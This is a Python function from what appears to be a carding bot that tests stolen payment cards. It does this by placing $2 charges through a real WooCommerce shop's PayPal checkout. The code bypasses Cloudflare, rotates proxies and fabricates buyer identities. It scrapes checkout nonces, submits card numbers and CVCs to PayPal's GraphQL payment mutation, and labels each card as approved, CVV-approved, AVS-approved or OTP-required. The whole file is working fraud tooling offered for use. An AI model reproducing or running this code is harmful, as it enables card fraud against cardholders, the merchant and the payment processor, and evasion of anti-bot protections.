def check_card_paypal(cc_line):
    """Main PayPal card check function compatible with bot system"""
    start_time = time.time()
    
    try:
        # Parse card details
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "❌ Invalid card format. Expected: number|mm|yy|cvc"

        n, mm, yy, cvc = parts

        # FIRST: Get BIN information before anything else
        print("Getting BIN information...")
        bin_info = get_bin_info(n[:6])
        print(f"BIN Info retrieved: {bin_info}")

        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" not in yy:
            yy = f'20{yy}'

        # Generate user info
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        phone_num = generate_phone_number()

        # Use proxy if available
        proxy = get_random_proxy()

        # STEP 1: Bypass Cloudflare protection
        print("Step 1: Bypassing Cloudflare protection...")
        user = get_rotating_user_agent()
        
        # Try to bypass Cloudflare first
        cf_response = bypass_cloudflare('https://switchupcb.com/shop/i-buy/', proxy)
        
        if cf_response and cf_response.status_code == 200:
            print("Cloudflare bypass successful!")
            # Create session with cookies from cloudscraper
            r = requests.Session()
            r.headers.update({
                'User-Agent': user,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            })
            # Copy cookies from cloudscraper
            r.cookies.update(cf_response.cookies)
        else:
            print("Cloudflare bypass failed, trying normal requests...")
            r = requests.Session()
            r.headers.update({
                'User-Agent': user,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            })

        # STEP 2: Add to cart
        print("Step 2: Adding to cart...")
        
        # Prepare the form data exactly as in your cURL
        boundary = "----WebKitFormBoundary19NfzWBMhpyCk7Ue"
        
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': f'multipart/form-data; boundary={boundary}',
            'origin': 'https://switchupcb.com',
            'priority': 'u=0, i',
            'referer': 'https://switchupcb.com/shop/i-buy/',
            'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        # Build the multipart form data manually
        body = f"""--{boundary}
Content-Disposition: form-data; name="woonp"

1.00
--{boundary}
Content-Disposition: form-data; name="quantity"

1
--{boundary}
Content-Disposition: form-data; name="add-to-cart"

4451
--{boundary}--"""

        try:
            response = r.post('https://switchupcb.com/shop/i-buy/', 
                            headers=headers, 
                            data=body,
                            proxies=proxy, 
                            verify=False, 
                            timeout=30)
            
            print(f"Response status: {response.status_code}")
            
            if response.status_code == 403:
                # If we still get 403, try with cloudscraper directly
                print("Still getting 403, trying with cloudscraper directly...")
                scraper = cloudscraper.create_scraper()
                if proxy:
                    scraper.proxies = proxy
                
                response = scraper.post('https://switchupcb.com/shop/i-buy/', 
                                      headers=headers, 
                                      data=body,
                                      timeout=30)
            
            response.raise_for_status()
            print("Add to cart successful!")
            
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            error_msg = str(e)
            if "403" in error_msg:
                error_msg = "Cloudflare Protection Blocked - Use Better Proxies"
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # STEP 3: Go to checkout page
        print("Step 3: Loading checkout page...")
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://switchupcb.com/cart/',
            'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        try:
            response = r.get('https://switchupcb.com/checkout/', headers=headers, proxies=proxy, verify=False, timeout=30)
            response.raise_for_status()
            print("Checkout page loaded successfully")
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Checkout failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Extract security tokens
        try:
            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
            nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text)
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
            create = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
            
            if not all([sec, nonce, check, create]):
                # If regex fails, try alternative patterns
                sec = re.search(r'"update_order_review_nonce":"([^"]+)"', response.text)
                nonce = re.search(r'"save_checkout_form[^"]*","nonce":"([^"]+)"', response.text)
                check = re.search(r'woocommerce-process-checkout-nonce" value="([^"]+)"', response.text)
                create = re.search(r'"create_order[^"]*","nonce":"([^"]+)"', response.text)
            
            sec = sec.group(1) if sec else "default_sec"
            nonce = nonce.group(1) if nonce else "default_nonce"
            check = check.group(1) if check else "default_check"
            create = create.group(1) if create else "default_create"
            
            print(f"Tokens extracted: sec={sec[:10]}..., check={check[:10]}...")
            
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to extract security tokens: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # STEP 4: Update order review
        print("Step 4: Updating order review...")
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {'wc-ajax': 'update_order_review'}
        
        # Build the post_data string
        post_data_parts = [
            'wc_order_attribution_source_type=typein',
            'wc_order_attribution_referrer=(none)',
            'wc_order_attribution_utm_campaign=(none)',
            'wc_order_attribution_utm_source=(direct)',
            'wc_order_attribution_utm_medium=(none)',
            'wc_order_attribution_utm_content=(none)',
            'wc_order_attribution_utm_id=(none)',
            'wc_order_attribution_utm_term=(none)',
            'wc_order_attribution_utm_source_platform=(none)',
            'wc_order_attribution_utm_creative_format=(none)',
            'wc_order_attribution_utm_marketing_tactic=(none)',
            f'wc_order_attribution_session_entry={requests.utils.quote("https://switchupcb.com/")}',
            'wc_order_attribution_session_start_time=2025-01-15+16%3A33%3A26',
            'wc_order_attribution_session_pages=15',
            'wc_order_attribution_session_count=1',
            f'wc_order_attribution_user_agent={requests.utils.quote(user)}',
            f'billing_first_name={first_name}',
            f'billing_last_name={last_name}',
            'billing_company=',
            'billing_country=US',
            f'billing_address_1={requests.utils.quote(street_address)}',
            'billing_address_2=',
            f'billing_city={city}',
            f'billing_state={state}',
            f'billing_postcode={zip_code}',
            f'billing_phone={phone_num}',
            f'billing_email={acc}',
            'account_username=',
            'account_password=',
            'order_comments=',
            'g-recaptcha-response=',
            'payment_method=stripe',
            'wc-stripe-payment-method-upe=',
            'wc_stripe_selected_upe_payment_type=',
            'wc-stripe-is-deferred-intent=1',
            'terms-field=1',
            f'woocommerce-process-checkout-nonce={check}',
            '_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
        ]
        
        form_data = {
            'security': sec,
            'payment_method': 'stripe',
            'country': 'US',
            'state': state,
            'postcode': zip_code,
            'city': city,
            'address': street_address,
            'address_2': '',
            's_country': 'US',
            's_state': state,
            's_postcode': zip_code,
            's_city': city,
            's_address': street_address,
            's_address_2': '',
            'has_full_address': 'true',
            'post_data': '&'.join(post_data_parts)
        }

        try:
            response = r.post('https://switchupcb.com/', params=params, headers=headers, data=form_data, proxies=proxy, verify=False, timeout=30)
            response.raise_for_status()
            print("Order review updated successfully")
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Update order review failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # STEP 5: Create order with retry logic
        print("Step 5: Creating order with retry logic...")
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://switchupcb.com',
            'pragma': 'no-cache',
            'referer': 'https://switchupcb.com/checkout/',
            'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {'wc-ajax': 'ppc-create-order'}
        
        # URL encode the form_encoded data
        form_encoded_data = '&'.join([
            f'billing_first_name={first_name}',
            f'billing_last_name={last_name}',
            'billing_company=',
            'billing_country=US',
            f'billing_address_1={requests.utils.quote(street_address)}',
            'billing_address_2=',
            f'billing_city={city}',
            f'billing_state={state}',
            f'billing_postcode={zip_code}',
            f'billing_phone={phone_num}',
            f'billing_email={acc}',
            'account_username=',
            'account_password=',
            'order_comments=',
            'wc_order_attribution_source_type=typein',
            'wc_order_attribution_referrer=(none)',
            'wc_order_attribution_utm_campaign=(none)',
            'wc_order_attribution_utm_source=(direct)',
            'wc_order_attribution_utm_medium=(none)',
            'wc_order_attribution_utm_content=(none)',
            'wc_order_attribution_utm_id=(none)',
            'wc_order_attribution_utm_term=(none)',
            f'wc_order_attribution_session_entry={requests.utils.quote("https://switchupcb.com/shop/drive-me-so-crazy/")}',
            'wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46',
            'wc_order_attribution_session_pages=3',
            'wc_order_attribution_session_count=1',
            f'wc_order_attribution_user_agent={requests.utils.quote(user)}',
            'g-recaptcha-response=',
            'wc-stripe-payment-method-upe=',
            'wc_stripe_selected_upe_payment_type=card',
            'payment_method=ppcp-gateway',
            'terms=on',
            'terms-field=1',
            f'woocommerce-process-checkout-nonce={check}',
            '_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
            'ppcp-funding-source=card'
        ])

        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': form_encoded_data,
            'createaccount': False,
            'save_payment_method': False,
        }

        # ADDED RETRY LOGIC FOR ORDER CREATION
        max_retries = 3
        retry_delay = 2  # seconds
        
        for attempt in range(max_retries):
            try:
                print(f"Order creation attempt {attempt + 1}/{max_retries}")
                response = r.post('https://switchupcb.com/', params=params, headers=headers, json=json_data, proxies=proxy, verify=False, timeout=30)
                response.raise_for_status()
                response_data = response.json()
                
                if 'data' in response_data and 'id' in response_data['data']:
                    order_id = response_data['data']['id']
                    pcp = response_data['data'].get('custom_id', 'default_custom_id')
                    print(f"Order created successfully: {order_id}")
                    break  # Success, break out of retry loop
                else:
                    raise ValueError("Invalid response format for order creation")
                    
            except (requests.RequestException, KeyError, ValueError) as e:
                if attempt < max_retries - 1:
                    print(f"Order creation failed (attempt {attempt + 1}), retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                    # Try with a new proxy on retry
                    proxy = get_random_proxy()
                else:
                    # All retries failed
                    elapsed_time = time.time() - start_time
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to create order after {max_retries} attempts: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # STEP 6: Generate random session IDs for PayPal
        print("Step 6: Processing PayPal payment...")
        lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
        session_id = f'uid_{lol1}_{lol3}'
        button_session_id = f'uid_{lol2}_{lol3}'

        # PayPal request
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.paypal.com/smart/buttons',
            'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        params = {
            'sessionID': session_id,
            'buttonSessionID': button_session_id,
            'locale.x': 'en_US',
            'commit': 'true',
            'hasShippingCallback': 'false',
            'env': 'production',
            'country.x': 'US',
            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
            'disable-card': '',
            'token': order_id,
        }

        try:
            response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxies=proxy, verify=False, timeout=30)
            response.raise_for_status()
            print("PayPal card fields loaded successfully")
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ PayPal card fields failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # STEP 7: Final payment request
        print("Step 7: Sending final payment request...")
        random_code = generate_random_code()

        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'referer': f'https://www.paypal.com/smart/card-fields?sessionID={session_id}&buttonSessionID={button_session_id}',
            'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
        }

        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': n,
                    'type': 'VISA',
                    'expirationDate': mm+'/'+yy,
                    'postalCode': zip_code,
                    'securityCode': cvc,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': street_address,
                    'line2': None,
                    'city': city,
                    'state': state,
                    'postalCode': zip_code,
                    'country': 'US',
                },
                'email': acc,
                'currencyConversionType': 'VENDOR',
            },
            'operationName': 'payWithCard',
        }

        try:
            response = r.post('https://www.paypal.com/graphql', headers=headers, json=json_data, proxies=proxy, verify=False, timeout=30)
            response.raise_for_status()
            last = response.text
            print("Final payment request completed")
            
            # Print the actual response for debugging
            print(f"PayPal Response: {last[:500]}...")
            
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Final payment failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Process response and format result
        elapsed_time = time.time() - start_time
        
        # Determine status based on response
        result_text = ""
        if ('ADD_SHIPPING_ERROR' in last or
            'NEED_CREDIT_CARD' in last or
            '"status": "succeeded"' in last or
            'Thank You For Donation.' in last or
            'Your payment has already been processed' in last or
            'Success ' in last):
            result_text = "CHARGE 2$ ✅"
            status, reason, approved = "APPROVED CC", "Approved - CHARGED 2$ ✅", True
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            result_text = "OTP 💥"
            status, reason, approved = "OTP REQUIRED", "3D Secure Verification Required", True
        elif 'INVALID_SECURITY_CODE' in last:
            result_text = "APPROVED CCN ✅"
            status, reason, approved = "APPROVED CC", "Approved - CVV Issue", True
        elif 'INVALID_BILLING_ADDRESS' in last:
            result_text = "APPROVED - AVS ✅"
            status, reason, approved = "APPROVED CC", "Approved - AVS Issue", True
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            result_text = "APPROVED!  - CHARGED 2$ ✅"
            status, reason, approved = "APPROVED CC", "Approved - CHARGED 2$ ✅", True
        else:
            try:
                errors = response.json().get('errors', [])
                if errors:
                    message = errors[0].get('message', 'Unknown error')
                    data = errors[0].get('data', [{}])
                    code = data[0].get('code', 'UNKNOWN') if data else 'UNKNOWN'
                    result_text = f"({code}: {message})"
                    status, reason, approved = "DECLINED CC", f"{code}: {message}", False
                else:
                    result_text = "Unknown Response"
                    status, reason, approved = "DECLINED CC", "Unknown Response", False
            except:
                result_text = "Unknown Error"
                status, reason, approved = "DECLINED CC", "Unknown Error", False

        # Format final response
        response_text = f"""
{status} {'❌' if not approved else '✅'}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        return response_text

    except Exception as e:
        elapsed_time = time.time() - start_time
        # Get BIN info even for errors to ensure we have it
        bin_info = get_bin_info(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info('')
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
